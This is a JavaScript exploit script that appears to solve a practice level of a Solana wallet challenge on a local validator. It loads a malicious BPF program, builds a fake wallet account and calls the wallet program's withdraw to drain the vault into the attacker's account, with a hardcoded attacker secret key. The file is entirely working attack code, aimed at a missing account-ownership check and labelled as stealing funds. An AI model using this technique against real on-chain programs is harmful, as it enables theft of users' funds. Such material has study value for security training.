const {
    Keypair,
    Transaction,
    LAMPORTS_PER_SOL,
    Connection,
    sendAndConfirmTransaction,
    PublicKey,
    BPF_LOADER_PROGRAM_ID,
    BpfLoader
} = require("@solana/web3.js");

const bs58 = require("bs58");
const fs = require("fs");
const process = require("process");

const { Wallet } = require("wallet");
const { Exploit } = require("exploit");

const authorityPublicKey = new PublicKey(bs58.decode("7By5EKRWGRKD5eQSh582u3QPcyuYRi7Me5UHzJ4hvru4"));
const walletProgramId = new PublicKey(bs58.decode("9sLzyFBA8UzZpN2WHBN9pJpAwVZue7APWfaTZ5yfRFxE"));

console.log(`[*] Authority: ${authorityPublicKey}`);
console.log(`[*] Wallet: ${walletProgramId}`);

const connection = new Connection("http://localhost:8899", "confirmed");

// initialize attacker's keys
let attackerSecretKey = Uint8Array.from([
    61,234,218,250,91,105,201,10,169,51,137,21,23,228,162,2,4,48,158,95,41,153,14,78,38,72,140,218,108,69,149,213,91,248,110,163,191,97,101,129,245,158,22,200,191,11,23,166,6,179,225,153,169,233,223,178,24,145,185,167,217,137,141,54
]);
let attacker = Keypair.fromSecretKey(attackerSecretKey);

(async () => {
    // receive 'tiny' airdrop
    {
        const sig = await connection.requestAirdrop(attacker.publicKey, 1.0 * LAMPORTS_PER_SOL);
        await connection.confirmTransaction({ signature: sig });
    }

    const balancePrev = await connection.getBalance(attacker.publicKey);
    console.log(`[*] Previous balance of attacker: ${balancePrev / LAMPORTS_PER_SOL} SOL`);

    // create fake wallet
    const exploit = Keypair.generate();
    const exploitId = exploit.publicKey;
    const exploitCode = fs.readFileSync("./exploit.so");
    {
        const success = await BpfLoader.load(connection, attacker, exploit, exploitCode, BPF_LOADER_PROGRAM_ID);
        if (!success) {
            console.log("[!] Failed to load exploit program!");
            throw "fail";
        }
        else {
            console.log("[+] Successfully loaded exploit program");
        }
    }
    console.log(`[*] Exploit program address: ${exploitId}`);

    // get vault address and set wallet data
    const [walletAddress, _walletBumpSeed] = PublicKey.findProgramAddressSync([authorityPublicKey.toBytes()], walletProgramId);
    const accountInfo = await connection.getAccountInfo(walletAddress);
    const vaultAddress = new PublicKey(accountInfo.data.slice(32, 64));
    const [fakeWalletPubkey, _seed] = PublicKey.findProgramAddressSync([attacker.publicKey.toBuffer()], exploitId);
    {
        const ix = Exploit.exploitLevel0(exploitId, fakeWalletPubkey, vaultAddress, attacker);
        const tx = new Transaction().add(ix);
        await sendAndConfirmTransaction(connection, tx, [attacker]);
    }

    // send exploit TX
    {
        const withdrawAmount = await connection.getBalance(vaultAddress);
        console.log(`[*] Amount of funds to steal: ${withdrawAmount / LAMPORTS_PER_SOL} SOL`);
        const ix = Wallet.withdraw(walletProgramId, fakeWalletPubkey, vaultAddress, attacker, attacker.publicKey, withdrawAmount);
        const tx = new Transaction().add(ix);
        await sendAndConfirmTransaction(connection, tx, [attacker]);
    }

    const balanceFinal = await connection.getBalance(attacker.publicKey);
    console.log(`[*] Final balance of attacker: ${balanceFinal / LAMPORTS_PER_SOL} SOL`);
})();